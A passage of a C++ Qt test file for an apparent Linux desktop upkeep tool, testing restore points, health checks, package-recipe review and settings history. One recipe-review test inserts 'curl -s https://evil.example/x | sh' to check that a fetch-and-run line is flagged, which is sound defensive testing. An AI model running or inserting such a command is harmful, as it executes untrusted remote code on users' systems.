        restore.setFreeScript(QStringLiteral("echo 1000000"));
        restore.setAdmin({QStringLiteral("sh"), QStringLiteral("-c"), QStringLiteral("exit 126"), QStringLiteral("admin")});
        restore.check();
        QTRY_COMPARE(restore.stage(), QStringLiteral("ready"));
        restore.choose(313);
        restore.askDelete();
        restore.confirmDelete();
        QTRY_COMPARE(restore.stage(), QStringLiteral("chosen"));
        QVERIFY(restore.note().contains(QStringLiteral("password box was closed")));
        QCOMPARE(restore.points().size(), 3);
    }

    void restorePointsAreReadWithoutAPasswordWhereTheSystemAllows()
    {
        // The person's own look is refused by snapper, but the system lets
        // them read the list through split-rock-admin: it is read at once.
        QTemporaryDir dir;
        const QString look = dir.filePath(QStringLiteral("look"));
        const QString listed = dir.filePath(QStringLiteral("listed"));
        QVERIFY(write(look, QStringLiteral("@@ snapper\nyes\n@@ list\nNo permissions.\n@@ free\nyes\n@@ end\n")));
        RestorePoints restore;
        restore.setElevate({});
        restore.setAdmin({QStringLiteral("sh"), QStringLiteral("-c"),
                          QStringLiteral("touch '%1'; cat '" FIXTURES_DIR "/chores/restore-look.txt'").arg(listed),
                          QStringLiteral("admin")});
        restore.setLookScript(QStringLiteral("cat '%1'").arg(look));
        restore.check();
        QTRY_COMPARE(restore.stage(), QStringLiteral("ready"));
        QVERIFY(QFile::exists(listed));
        QCOMPARE(restore.points().size(), 3);
        QCOMPARE(restore.notShown(), QString());
    }

    void aClosedPasswordBoxLeavesRestorePointsAskingAgain()
    {
        QTemporaryDir dir;
        const QString look = dir.filePath(QStringLiteral("look"));
        QVERIFY(write(look, QStringLiteral("@@ snapper\nyes\n@@ list\nNo permissions.\n@@ end\n")));
        RestorePoints restore;
        restore.setElevate({});
        // pkexec's own answer when its prompt is closed.
        restore.setAdmin({QStringLiteral("sh"), QStringLiteral("-c"), QStringLiteral("exit 126"), QStringLiteral("admin")});
        restore.setLookScript(QStringLiteral("cat '%1'").arg(look));
        restore.check();
        QTRY_COMPARE(restore.stage(), QStringLiteral("denied"));
        QCOMPARE(restore.notShown(), QString());
        restore.checkAsAdmin();
        QCOMPARE(restore.stage(), QStringLiteral("looking"));
        QTRY_COMPARE(restore.stage(), QStringLiteral("denied"));
        QVERIFY(restore.notShown().contains(QStringLiteral("password box was closed")));
        QVERIFY(restore.points().isEmpty());
        // Shown at the second try.
        restore.setAdmin({QStringLiteral("sh"), QStringLiteral("-c"),
                          QStringLiteral("cat '" FIXTURES_DIR "/chores/restore-look.txt'"), QStringLiteral("admin")});
        restore.checkAsAdmin();
        QTRY_COMPARE(restore.stage(), QStringLiteral("ready"));
        QCOMPARE(restore.notShown(), QString());
    }

    void theHealthCheckReadsEachPart()
    {
        const QList<HealthCheck::Item> items = HealthCheck::readLook(fixture(QStringLiteral("health-look.txt")), Now);
        QMap<QString, HealthCheck::Item> byId;
        for (const HealthCheck::Item &i : items)
            byId.insert(i.id, i);
        // A problem first.
        QCOMPARE(items.first().id, QStringLiteral("services"));
        QCOMPARE(byId.value(QStringLiteral("services")).state, QStringLiteral("bad"));
        QVERIFY(byId.value(QStringLiteral("services")).question.contains(QStringLiteral("bluetooth-autoconnect.service")));
        QCOMPARE(byId.value(QStringLiteral("space")).state, QStringLiteral("warn"));
        QCOMPARE(byId.value(QStringLiteral("space")).action, QStringLiteral("space"));
        QCOMPARE(byId.value(QStringLiteral("drive")).state, QStringLiteral("good"));
        QVERIFY(byId.value(QStringLiteral("battery")).detail.contains(QStringLiteral("86%")));
        QCOMPARE(byId.value(QStringLiteral("updates")).state, QStringLiteral("warn"));
        QCOMPARE(byId.value(QStringLiteral("updates")).action, QStringLiteral("update"));
        QCOMPARE(byId.value(QStringLiteral("restore")).state, QStringLiteral("good"));
        // Newer settings files from updates are listed, never counted as
        // something to look at, and can still be copied for help.
        QCOMPARE(byId.value(QStringLiteral("settings")).state, QStringLiteral("good"));
        QVERIFY(byId.value(QStringLiteral("settings")).detail.contains(QStringLiteral("Yours stay in use")));
        QVERIFY(!byId.value(QStringLiteral("settings")).question.isEmpty());
        QVERIFY(byId.value(QStringLiteral("crashes")).detail.contains(QStringLiteral("plasmashell (2)")));
        QCOMPARE(byId.value(QStringLiteral("pkgcache")).action, QStringLiteral("space"));

        // The Space row follows the Notice setting, as Core's Storage does:
        // 80% full is worth a look at the usual setting and not at Less, 90%
        // is worth a look at Less too, and 96% is a problem.
        const auto space = [](qint64 totalKb, qint64 freeKb, int notice) {
            QString look = fixture(QStringLiteral("health-look.txt"));
            look.replace(QStringLiteral("@@ disk\n500000000 48000000"),
                         QStringLiteral("@@ disk\n%1 %2").arg(totalKb).arg(freeKb));
            for (const HealthCheck::Item &i : HealthCheck::readLook(look, Now, notice)) {
                if (i.id == QLatin1String("space"))
                    return i.state;
            }
            return QString();
        };
        QCOMPARE(space(100000000, 30000000, 50), QStringLiteral("good"));
        QCOMPARE(space(100000000, 20000000, 50), QStringLiteral("warn"));
        QCOMPARE(space(100000000, 20000000, 0), QStringLiteral("good"));
        QCOMPARE(space(100000000, 10000000, 0), QStringLiteral("warn"));
        QCOMPARE(space(100000000, 4000000, 50), QStringLiteral("bad"));

        // Without restore points, it says so.
        QString none = fixture(QStringLiteral("health-look.txt"));
        none.replace(QStringLiteral("@@ snapper\nyes\n"), QStringLiteral("@@ snapper\n"));
        const QList<HealthCheck::Item> without = HealthCheck::readLook(none, Now);
        QVERIFY(std::any_of(without.cbegin(), without.cend(), [](const auto &i) {
            return i.id == QLatin1String("restore") && i.state == QLatin1String("warn");
        }));
    }

    void theHealthCheckRunsQuietlyOnceAWeek()
    {
        QSettings(QStringLiteral("split-rock"), QStringLiteral("upkeep")).remove(QStringLiteral("health"));
        HealthCheck health;
        health.setLookScript(printing(QStringLiteral("health-look.txt")));
        health.checkIfDue();
        QTRY_VERIFY(!health.lastChecked().isEmpty());
        QVERIFY(health.attention() > 0);
        // Quietly: the card stays closed.
        QCOMPARE(health.stage(), QString());
        QCOMPARE(health.lastChecked(), QStringLiteral("Today"));
        // Not again within the week.
        HealthCheck again;
        again.setLookScript(QStringLiteral("exit 1"));
        again.checkIfDue();
        QVERIFY(!again.busy());
        // Asked for, it opens.
        health.check();
        QCOMPARE(health.stage(), QStringLiteral("looking"));
        QTRY_COMPARE(health.stage(), QStringLiteral("done"));
    }

    void theBatteryIsReadAfterTheLookEnds()
    {
        // The look's own output comes back trimmed, ending "@@ end" with no
        // line after it; the battery, read apart, still makes its own row.
        QSettings(QStringLiteral("split-rock"), QStringLiteral("upkeep")).remove(QStringLiteral("health"));
        HealthCheck health;
        health.setLookScript(QStringLiteral("sed '/^@@ battery$/,/^@@ /{/^@@ battery$/d;/^[0-9]/d}' '")
                             + QStringLiteral(FIXTURES_DIR "/chores/health-look.txt'"));
        health.setBatteryLook([] { return QStringLiteral("@@ battery\n59927000 70003000 0\n"); });
        health.check();
        QTRY_COMPARE(health.stage(), QStringLiteral("done"));
        const QList<HealthCheck::Item> items = health.items();
        const auto battery = std::find_if(items.cbegin(), items.cend(), [](const auto &i) { return i.id == QLatin1String("battery"); });
        QVERIFY(battery != items.cend());
        QCOMPARE(battery->detail, QStringLiteral("Holds 86% of its original charge."));
    }

    void theHealthReportSaysWhatTheLookFound()
    {
        const QString look = fixture(QStringLiteral("health-look.txt"));
        QVERIFY(HealthCheck::lookFinished(look));
        QVERIFY(!HealthCheck::lookFinished(look.section(QStringLiteral("@@ end"), 0, 0)));
        const QList<HealthCheck::Item> items = HealthCheck::readLook(look, Now);
        const QStringList lines = HealthCheck::report(items).trimmed().split(QLatin1Char('\n'));
        QCOMPARE(lines.size(), items.size() + 1);
        QVERIFY(lines.first().startsWith(QStringLiteral("Health check: ")));
        QVERIFY(lines.at(1).startsWith(QStringLiteral("problem  Services: ")));
        QVERIFY(lines.at(1).contains(QStringLiteral("bluetooth-autoconnect.service")));
        QVERIFY(lines.last().startsWith(QStringLiteral("good")));
        QCOMPARE(HealthCheck::report({}).trimmed(), QStringLiteral("Health check: nothing needs a look."));
    }

    // The same look for Core: state, id, title and detail, between tabs.
    void theHealthFactsAreOneLineAnItem()
    {
        const QList<HealthCheck::Item> items = HealthCheck::readLook(fixture(QStringLiteral("health-look.txt")), Now);
        const QStringList lines = HealthCheck::facts(items).trimmed().split(QLatin1Char('\n'));
        QCOMPARE(lines.size(), items.size());
        const QStringList services = lines.first().split(QLatin1Char('\t'));
        QCOMPARE(services.size(), 4);
        QCOMPARE(services.at(0), QStringLiteral("problem"));
        QCOMPARE(services.at(1), QStringLiteral("services"));
        QVERIFY(services.at(3).contains(QStringLiteral("bluetooth-autoconnect.service")));
        for (const QString &line : lines)
            QCOMPARE(line.count(QLatin1Char('\t')), 3);
        HealthCheck::Item odd{QStringLiteral("x"), QStringLiteral("A\ttitle"), QStringLiteral("bad"),
                              QStringLiteral("Two\nlines"), {}, {}, {}};
        QCOMPARE(HealthCheck::facts({odd}), QStringLiteral("problem\tx\tA title\tTwo lines\n"));
    }

    // A problem no card fixes is copied with what this computer is, to ask
    // someone; the card says it runs weekly only while Core looks.
    void aProblemIsCopiedForHelp()
    {
        QCOMPARE(HealthCheck::helpText(QStringLiteral("Why?"), QStringLiteral("System: Arch Linux")),
                 QStringLiteral("Why?\n\nAbout my computer:\nSystem: Arch Linux"));
        QCOMPARE(HealthCheck::helpText(QStringLiteral("Why?"), QString()), QStringLiteral("Why?"));
        const QString about = HealthCheck::aboutThisComputer();
        QVERIFY(about.contains(QStringLiteral("System: ")));
        QVERIFY(about.contains(QStringLiteral("Linux kernel: ")));

        QTemporaryDir dir;
        HealthCheck health;
        health.setCoreSettings(dir.filePath(QStringLiteral("corerc")));
        QVERIFY(health.watched());
        QSettings(dir.filePath(QStringLiteral("corerc")), QSettings::IniFormat).setValue(QStringLiteral("Health/Enabled"), false);
        QVERIFY(!health.watched());
    }

    // The real look, on whatever computer runs the tests: it only reads, needs
    // no assistant, and comes through to its end.
    void theRealLookRunsToItsEnd()
    {
        QProcess look;
        look.start(QStringLiteral("/bin/sh"), {QStringLiteral("-c"), HealthCheck::defaultLookScript()});
        QVERIFY(look.waitForFinished(60000));
        QVERIFY(HealthCheck::lookFinished(QString::fromUtf8(look.readAllStandardOutput())));
    }

    void versionsCompareAsPacmanDoes()
    {
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.104.0-1"), QStringLiteral("1.105.1-1")) < 0);
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1:1.0-1"), QStringLiteral("2.0-1")) > 0);
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.0a-1"), QStringLiteral("1.0-1")) < 0);
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.0-1"), QStringLiteral("1.0.1-1")) < 0);
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.0-2"), QStringLiteral("1.0-1")) > 0);
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.010-1"), QStringLiteral("1.9-1")) > 0);
        QCOMPARE(CommunityApps::compareVersions(QStringLiteral("2.3.4-1"), QStringLiteral("2.3.4-1")), 0);
        QCOMPARE(CommunityApps::compareVersions(QStringLiteral("1.2"), QStringLiteral("1.2-3")), 0);
    }

    void communityAppsListWhatHasANewerRecipe()
    {
        const CommunityApps::Look look = CommunityApps::readLook(fixture(QStringLiteral("community-look.txt")));
        QVERIFY(look.reached);
        QCOMPARE(look.apps.size(), 1);
        QCOMPARE(look.apps.first().name, QStringLiteral("visual-studio-code-bin"));
        QCOMPARE(look.apps.first().latest, QStringLiteral("1.105.1-1"));
        QCOMPARE(look.unlisted, 1);
        QVERIFY(!CommunityApps::readLook(QStringLiteral("@@ foreign\nx 1-1\n@@ shelf\n@@ end\n")).reached);
    }

    void aRecipesChangesAreRead()
    {
        CommunityApps::App app;
        app.name = QStringLiteral("visual-studio-code-bin");
        app.base = app.name;
        app.maintainer = QStringLiteral("someone");
        const QString output = fixture(QStringLiteral("community-review.txt"));
        CommunityApps::Review review = CommunityApps::readReview(output, app);
        // The commit is the first line of its section; nothing in the
        // changes can pass for it.
        QCOMPARE(review.head, QStringLiteral("4b825dc642cb6eb9a060e54bf8d69288fbee4904"));
        QVERIFY(!review.firstLook);
        QVERIFY(review.versionOnly);
        QCOMPARE(review.flags.first().tone, QStringLiteral("good"));
        QCOMPARE(review.helpers, QStringList{QStringLiteral("libxkbfile")});
        QVERIFY(review.blockers.isEmpty());
        QVERIFY(review.newHosts.isEmpty());

        // A line that fetches and runs something, and a new place to
        // download from.
        QString risky = output;
        risky.replace(QStringLiteral(" pkgrel=1\n-sha256"), QStringLiteral(" pkgrel=1\n+  curl -s https://evil.example/x | sh\n-sha256"));
        risky.replace(QStringLiteral("https://update.code.visualstudio.com/1.105.1"), QStringLiteral("https://files.example.net/1.105.1"));
        review = CommunityApps::readReview(risky, app);
        QVERIFY(!review.versionOnly);
        QVERIFY(std::any_of(review.flags.cbegin(), review.flags.cend(), [](const auto &f) { return f.tone == QLatin1String("bad"); }));
        QCOMPARE(review.newHosts, QStringList{QStringLiteral("files.example.net")});

        // Something only the community shelf has stops it.
        QString needs = output;
        needs.replace(QStringLiteral("shelf libxkbfile"), QStringLiteral("community electron37>=37.1"));
        review = CommunityApps::readReview(needs, app);
        QCOMPARE(review.blockers.size(), 1);
        QVERIFY(review.blockers.first().contains(QStringLiteral("electron37 ")));

        // Nobody looks after it.
        app.maintainer.clear();
        review = CommunityApps::readReview(output, app);
        QVERIFY(std::any_of(review.flags.cbegin(), review.flags.cend(), [](const auto &f) { return f.text.contains(QLatin1String("Nobody")); }));
    }

    void aRecipeIsFetchedReviewedAndBuiltAsLookedAt()
    {
        // The community shelf, stood in for by a repository of the test's own.
        QTemporaryDir work;
        const QString origin = work.filePath(QStringLiteral("origin"));
        QDir().mkpath(origin);
        QVERIFY(git(origin, {QStringLiteral("init"), QStringLiteral("-q")}));
        QVERIFY(write(origin + QStringLiteral("/.SRCINFO"), srcinfo(QStringLiteral("1.0"))));
        QVERIFY(write(origin + QStringLiteral("/PKGBUILD"), QStringLiteral("pkgname=demo\npkgver=1.0\npkgrel=1\n")));
        QVERIFY(git(origin, {QStringLiteral("add"), QStringLiteral(".")}));
        QVERIFY(git(origin, {QStringLiteral("commit"), QStringLiteral("-qm"), QStringLiteral("1.0")}));
        const QString recipes = work.filePath(QStringLiteral("recipes"));
        QDir().mkpath(recipes);
        QVERIFY(git(recipes, {QStringLiteral("clone"), QStringLiteral("-q"), origin, QStringLiteral("demo")}));
        QVERIFY(write(origin + QStringLiteral("/.SRCINFO"), srcinfo(QStringLiteral("1.1"))));
        QVERIFY(write(origin + QStringLiteral("/PKGBUILD"), QStringLiteral("pkgname=demo\npkgver=1.1\npkgrel=1\n")));
        QVERIFY(git(origin, {QStringLiteral("commit"), QStringLiteral("-qam"), QStringLiteral("1.1")}));
        const QString head = gitOut(origin, {QStringLiteral("rev-parse"), QStringLiteral("HEAD")});

        StandIns standIns;
        QVERIFY(standIns.add(QStringLiteral("pacman"), QStringLiteral(
            "case $1 in\n"
            "  -T) exit 0 ;;\n"
            "  -Qqp) echo demo ;;\n"
            "  *) echo \"pacman $*\" ;;\n"
            "esac\n")));
        QVERIFY(standIns.add(QStringLiteral("makepkg"), QStringLiteral(
            "if [ \"$1\" = --packagelist ]; then echo \"$PWD/demo-1.1-1-any.pkg.tar.zst\"; exit 0; fi\n"
            "echo \"==> Making package: demo $(sed -n 's/^pkgver=//p' PKGBUILD)\"\n"
            "touch demo-1.1-1-any.pkg.tar.zst\n")));
        QTemporaryDir logs;

        CommunityApps community;
        community.setElevate({});
        community.setAdmin(adminInSource());
        community.setLogFolder(logs.path());
        community.setRecipes(recipes);
        community.setLookScript(QStringLiteral(
            "printf '@@ foreign\\ndemo 1.0-1\\n@@ shelf\\n{\"results\":[{\"Name\":\"demo\",\"PackageBase\":\"demo\","
            "\"Version\":\"1.1-1\",\"Maintainer\":\"someone\"}]}\\n@@ end\\n'"));
        community.check();
        QTRY_COMPARE(community.stage(), QStringLiteral("ready"));
        community.look(QStringLiteral("demo"));
        QCOMPARE(community.stage(), QStringLiteral("reviewing"));
        QTRY_COMPARE_WITH_TIMEOUT(community.stage(), QStringLiteral("reviewed"), 20000);
        const CommunityApps::Review review = community.review();
        QCOMPARE(review.head, head);
        QVERIFY(!review.firstLook);
        QVERIFY(review.versionOnly);
        QVERIFY(review.diff.contains(QStringLiteral("+pkgver=1.1")));

        community.start();
        QCOMPARE(community.stage(), QStringLiteral("updating"));
        QTRY_COMPARE_WITH_TIMEOUT(community.stage(), QStringLiteral("done"), 20000);
        QVERIFY(community.log().contains(QStringLiteral("==> Making package: demo 1.1")));
        QVERIFY(community.log().contains(QStringLiteral("pacman -U --noconfirm --noprogressbar --color never")));
        QCOMPARE(gitOut(recipes + QStringLiteral("/demo"), {QStringLiteral("rev-parse"), QStringLiteral("HEAD")}), head);
        // Done, it leaves the list.
        QVERIFY(community.apps().isEmpty());
    }

    // What changed: a day at a time, newest first, each with its way back.
    void whatChangedReadsEachDay()
    {
        QList<ChangeRunner::Record> records;
        ChangeRunner::Record pointer;
        pointer.id = QStringLiteral("c1");
        pointer.made = QDateTime(QDate(2026, 10, 9), QTime(11, 30));
        pointer.proposal.title = QStringLiteral("Use the Bibata pointer");
        pointer.proposal.undo = QStringLiteral("plasma-apply-cursortheme breeze_cursors");
        pointer.status = QStringLiteral("done");
        records.append(pointer);
        ChangeRunner::Record fans = pointer;
        fans.id = QStringLiteral("c0");
        fans.made = QDateTime(QDate(2026, 10, 8), QTime(20, 0));
        fans.proposal.title = QStringLiteral("Set the fans to Quiet");
        fans.status = QStringLiteral("undone");
        fans.undone = QDateTime(QDate(2026, 10, 9), QTime(9, 0));
        records.append(fans);
        ChangeRunner::Record old = pointer;
        old.id = QStringLiteral("c-old");
        old.made = QDateTime(QDate(2026, 9, 1), QTime(9, 0));
        records.append(old);

        const RecentChanges::Look look = RecentChanges::readLook(fixture(QStringLiteral("recent-look.txt")), records, Now);
        QMap<QString, RecentChanges::Item> byId;
        QStringList order;
        for (const RecentChanges::Item &item : look.items) {
            byId.insert(item.id, item);
            order.append(item.id);
        }
        QVERIFY(look.restorePoints);
        // Today first: the restart the update waits for, then the change made
        // from a card, then the rest, newest first.
        QCOMPARE(order.mid(0, 2), (QStringList{QStringLiteral("restart"), QStringLiteral("own-c1")}));
        QCOMPARE(byId.value(QStringLiteral("own-c1")).action, QStringLiteral("undo"));
        QCOMPARE(byId.value(QStringLiteral("own-c1")).change, QStringLiteral("c1"));
        // Put back already: nothing to undo.
        QCOMPARE(byId.value(QStringLiteral("own-c0")).action, QString());
        QVERIFY(byId.value(QStringLiteral("own-c0")).detail.startsWith(QLatin1String("Put back")));
        // Older than two weeks is left out.
        QVERIFY(!byId.contains(QStringLiteral("own-c-old")));
        QVERIFY(!byId.contains(QStringLiteral("update-2026-09-20")));

        const RecentChanges::Item update = byId.value(QStringLiteral("update-2026-10-08"));
        QCOMPARE(update.title, QStringLiteral("5 parts of the system updated"));
        QVERIFY2(update.detail.contains(QLatin1String("the Plasma desktop 6.7.4")), qPrintable(update.detail));
        QVERIFY(update.detail.contains(QLatin1String("the Linux kernel 6.17.2")));
        QVERIFY(update.detail.contains(QLatin1String("the graphics drivers")));
        QCOMPARE(update.action, QStringLiteral("restore"));
        QVERIFY(update.question.contains(QLatin1String("parts of the system yesterday, including")));
        QVERIFY(byId.value(QStringLiteral("update-2026-10-01")).detail.startsWith(QStringLiteral("Nothing a person would notice by name · ")));
        // What a helper needs to act: every version, old to new, where the old
        // ones are, and what went wrong since.
        QVERIFY2(update.help.contains(QLatin1String("- plasma-workspace 6.7.3-1 to 6.7.4-1")), qPrintable(update.help));
        QVERIFY(update.help.contains(QLatin1String("- mesa 1:25.2.3-1 to 1:25.2.4-1")));
        QVERIFY2(update.help.contains(QLatin1String("2 of 5 are still in the package cache")), qPrintable(update.help));
        QVERIFY(update.help.contains(QLatin1String("restore point from before can put it all back")));
        QVERIFY(update.help.contains(QLatin1String("- kwin_wayland: Failed to load the screen's colour profile")));

        // An install or removal is said by the app's name; a package with no
        // app is only counted, as a part of the system, and named for help.
        QCOMPARE(byId.value(QStringLiteral("install-2026-10-09")).title, QStringLiteral("Installed VLC media player"));
        QVERIFY2(byId.value(QStringLiteral("install-2026-10-09")).detail.startsWith(QStringLiteral("And 1 part of the system · ")), qPrintable(byId.value(QStringLiteral("install-2026-10-09")).detail));
        QCOMPARE(byId.value(QStringLiteral("remove-2026-10-09")).title, QStringLiteral("Removed Okular"));
        const RecentChanges::Item elisa = byId.value(QStringLiteral("install-2026-10-07"));
        QCOMPARE(elisa.title, QStringLiteral("Installed Elisa"));
        QVERIFY2(elisa.detail.startsWith(QStringLiteral("And 3 parts of the system · ")), qPrintable(elisa.detail));
        QVERIFY2(elisa.help.contains(QLatin1String("- dovecot 2.4.1-1")) && elisa.help.contains(QLatin1String("- shuffle-plasma 1.1.0-1")), qPrintable(elisa.help));
        QCOMPARE(byId.value(QStringLiteral("install-2026-10-06")).title, QStringLiteral("2 parts of the system installed"));
        QCOMPARE(byId.value(QStringLiteral("remove-2026-10-07")).title, QStringLiteral("1 part of the system removed"));
        for (const RecentChanges::Item &item : look.items)
            QVERIFY2(!item.title.contains(QLatin1String("dovecot")) && !item.title.contains(QLatin1String("shuffle-plasma")), qPrintable(item.title));

        // Flathub apps, without the parts that come with them.
        // One updated from a commit Flathub keeps goes back to it on its own row.
        const RecentChanges::Item firefox = byId.value(byId.keys().filter(QStringLiteral("app-org.mozilla.firefox-")).value(0));
        QCOMPARE(firefox.title, QStringLiteral("Firefox updated"));
        QCOMPARE(firefox.action, QStringLiteral("goback"));
        QCOMPARE(firefox.installation, QStringLiteral("system"));
        QCOMPARE(firefox.commit, QString(64, QLatin1Char('b')));
        QVERIFY(firefox.password);
        QVERIFY(!byId.contains(QStringLiteral("apps-2026-10-09")));
        QVERIFY2(byId.value(QStringLiteral("apps-2026-10-07")).detail.startsWith(QStringLiteral("Installed Spotify") + QStringLiteral(" · ")), qPrintable(byId.value(QStringLiteral("apps-2026-10-07")).detail));

        // Settings by what they hold; a file a person wouldn't know is left out.
        QCOMPARE(byId.value(QStringLiteral("settings-2026-10-09")).detail, QStringLiteral("Look, colors and fonts · Windows and effects"));
        QCOMPARE(byId.value(QStringLiteral("settings-2026-10-08")).detail, QStringLiteral("Displays · Mouse, touchpad and pointer"));

        const RecentChanges::Item bluetooth = byId.value(QStringLiteral("service-bluetooth.service"));
        QCOMPARE(bluetooth.title, QStringLiteral("Stopped working: Bluetooth service"));
        // What it said last, and the way back on the row.
        QVERIFY2(bluetooth.detail.startsWith(QLatin1String("Said \"Failed to set mode: Blocked through rfkill (0x12)\"")),
                 qPrintable(bluetooth.detail));
        QCOMPARE(bluetooth.action, QStringLiteral("start"));
        QCOMPARE(bluetooth.actionLabel, QStringLiteral("Start it again"));
        QVERIFY(bluetooth.systemUnit);
        QVERIFY(bluetooth.password);
        QVERIFY(bluetooth.help.contains(QLatin1String("Starting Bluetooth service...\nFailed to set mode")));
        const RecentChanges::Item syncthing = byId.value(QStringLiteral("service-syncthing.service"));
        QVERIFY(syncthing.detail.contains(QLatin1String("of yours")));
        QVERIFY(!syncthing.password);
        QCOMPARE(byId.value(QStringLiteral("restart")).action, QStringLiteral("restart"));

        // Without restore points, going back is asked about.
        QString none = fixture(QStringLiteral("recent-look.txt"));
        none.replace(QStringLiteral("@@ snapper\nyes\n"), QStringLiteral("@@ snapper\n"));
        const RecentChanges::Look without = RecentChanges::readLook(none, {}, Now);
        for (const RecentChanges::Item &item : without.items) {
            if (item.kind == QLatin1String("update"))
                QCOMPARE(item.action, QStringLiteral("ask"));
        }
        // Nothing at all: nothing to show.
        QVERIFY(RecentChanges::readLook(QStringLiteral("@@ kernel\n6.1\npresent\n@@ end\n"), {}, Now).items.isEmpty());
    }

    // Core keeps copies of the settings What changed reads, so each row says
    // the change itself, old to new, with its way back.
    void whatChangedSaysEachSettingExactly()
    {
        QTemporaryDir config;
        QTemporaryDir folder;
        const auto write = [&config](const QString &file, const QByteArray &text) {
            QFile out(config.filePath(file));
            QVERIFY(out.open(QIODevice::WriteOnly | QIODevice::Truncate));
            out.write(text);
        };
        const QString applets = QStringLiteral("plasma-org.kde.plasma.desktop-appletsrc");
        const QByteArray outputs = R"([{"name":"outputs","data":[{"connectorName":"eDP-1","edidIdentifier":"ABC 1","scale":1.75,)"
                                   R"("mode":{"width":2560,"height":1600,"refreshRate":180000},"transform":"Normal"}]},)"
                                   R"({"name":"setups","data":[{"lidClosed":false,"outputs":[{"enabled":true,"outputIndex":0,)"
                                   R"("position":{"x":0,"y":0}}]}]}])";
        write(QStringLiteral("kwinoutputconfig.json"), outputs);
        write(QStringLiteral("kglobalshortcutsrc"), "[kwin]\n_k_friendly_name=KWin\nTile windows=Meta+T,Meta+T,Tile windows\n");
        write(QStringLiteral("kwinrc"), "[Plugins]\nblurEnabled=true\n\n[Windows]\nBorderlessMaximizedWindows=false\n");
        write(applets, "[Containments][1][Applets][5]\nplugin=org.kde.plasma.digitalclock\n\n"
                       "[Containments][1][Applets][5][Configuration]\npopupWidth=300\n");
        write(QStringLiteral("kdeglobals"), "[General]\nColorScheme=BreezeDark\n");

        SettingsHistory history(folder.path(), config.path());
        const QDateTime morning(QDate(2026, 10, 21), QTime(9, 0));
        // The first look only takes the copies.
        QVERIFY(history.look(morning).isEmpty());
        QVERIFY(history.keptSince().isValid());
        // The desktop writing the same values again, or keeping its own: no
        // change.
        write(QStringLiteral("kdeglobals"), "[General]\nColorScheme=BreezeDark\n\n");
        write(applets, "[Containments][1][Applets][5]\nplugin=org.kde.plasma.digitalclock\n\n"
                       "[Containments][1][Applets][5][Configuration]\npopupWidth=320\n");
        write(QStringLiteral("kglobalshortcutsrc"), "[kwin]\n_k_friendly_name=KWin Window Manager\nTile windows=Meta+T,Meta+T,Tile windows\n");
        QVERIFY(history.look(morning.addSecs(60)).isEmpty());

        // What a person changed.
        QByteArray scaled = outputs;
        scaled.replace("\"scale\":1.75", "\"scale\":1.5");
        write(QStringLiteral("kwinoutputconfig.json"), scaled);
        write(QStringLiteral("kglobalshortcutsrc"), "[kwin]\n_k_friendly_name=KWin Window Manager\nTile windows=none,Meta+T,Tile windows\n");
        write(QStringLiteral("kwinrc"), "[Plugins]\nblurEnabled=false\n\n[Windows]\nBorderlessMaximizedWindows=false\n");
        write(QStringLiteral("kdeglobals"), "[General]\nColorScheme=BreezeLight\n");
        const QDateTime at(QDate(2026, 10, 21), QTime(9, 14));
        QCOMPARE(history.look(at).size(), 4);
        QCOMPARE(history.changes().size(), 4);
        // A settings file made since the copies were taken: what it was made
        // with is a change too.
        {
            SettingsHistory fresh(folder.path() + QStringLiteral("/fresh"), config.path());
            QVERIFY(fresh.look(morning).isEmpty());
            QVERIFY(!QFile::exists(config.filePath(QStringLiteral("kxkbrc"))));
            write(QStringLiteral("kxkbrc"), "[Layout]\nShowSingle=true\n");
            const QList<SettingsChange> made = fresh.look(at);
            QCOMPARE(made.size(), 1);
            QCOMPARE(made.first().key, QStringLiteral("ShowSingle"));
            QVERIFY(!made.first().wasSet);
            QFile::remove(config.filePath(QStringLiteral("kxkbrc")));
        }

        const QString program = QStringLiteral("/usr/bin/split-rock");
        QMap<QString, SettingRow> byArea;
        for (const SettingRow &row : SettingRows::rows(history.changes(), program))
            byArea.insert(row.area, row);
        QCOMPARE(byArea.size(), 4);

        const SettingRow screen = byArea.value(QStringLiteral("Displays"));
        QCOMPARE(screen.title, QStringLiteral("Built-in screen: scale 175% to 150%"));
        QCOMPARE(screen.detail, QStringLiteral("Displays · ") + SettingRows::timeWords(at));
        QCOMPARE(screen.way, QStringLiteral("putback"));
        QCOMPARE(screen.putBack.command, QStringLiteral("kscreen-doctor 'output.eDP-1.scale.1.75'"));
        QCOMPARE(screen.putBack.undo, QStringLiteral("kscreen-doctor 'output.eDP-1.scale.1.5'"));
        QVERIFY(screen.putBack.files.isEmpty());
        QCOMPARE(screen.exact, (QStringList{QStringLiteral("kwinoutputconfig.json [eDP-1] scale: 1.75 to 1.5")}));
        QVERIFY(screen.putBack.elevation().isEmpty());

        const SettingRow keys = byArea.value(QStringLiteral("Keyboard shortcuts"));
        QCOMPARE(keys.title, QStringLiteral("Shortcut for Tile windows removed"));
        QVERIFY2(keys.detail.startsWith(QStringLiteral("Was Meta+T · Keyboard shortcuts · ")), qPrintable(keys.detail));
        QCOMPARE(keys.way, QStringLiteral("putback"));
        QCOMPARE(keys.putBack.command,
                 QStringLiteral("'/usr/bin/split-rock' --set-shortcut 'kwin' 'Tile windows' 'Meta+T' 'Tile windows'"));
        QCOMPARE(keys.putBack.undo, QStringLiteral("'/usr/bin/split-rock' --set-shortcut 'kwin' 'Tile windows' '' 'Tile windows'"));

        const SettingRow effects = byArea.value(QStringLiteral("Windows and effects"));
        QCOMPARE(effects.title, QStringLiteral("Blur effect turned off"));
        QCOMPARE(effects.putBack.command,
                 QStringLiteral("kwriteconfig6 --file 'kwinrc' --group 'Plugins' --key 'blurEnabled' --notify -- 'true' && "
                                "[ \"$(kreadconfig6 --file 'kwinrc' --group 'Plugins' --key 'blurEnabled')\" = 'true' ]"));
        QCOMPARE(effects.page, QStringLiteral("kcm_kwin_effects"));
        QCOMPARE(effects.putBack.files.size(), 1);

        // The look opens its own page in Settings, until putting it back live
        // is proven; its help says exactly what changed.
        const SettingRow look = byArea.value(QStringLiteral("Look, colors and fonts"));
        QCOMPARE(look.title, QStringLiteral("Colors changed from Breeze Dark to Breeze Light"));
        QCOMPARE(look.way, QStringLiteral("settings"));
        QCOMPARE(look.page, QStringLiteral("kcm_colors"));
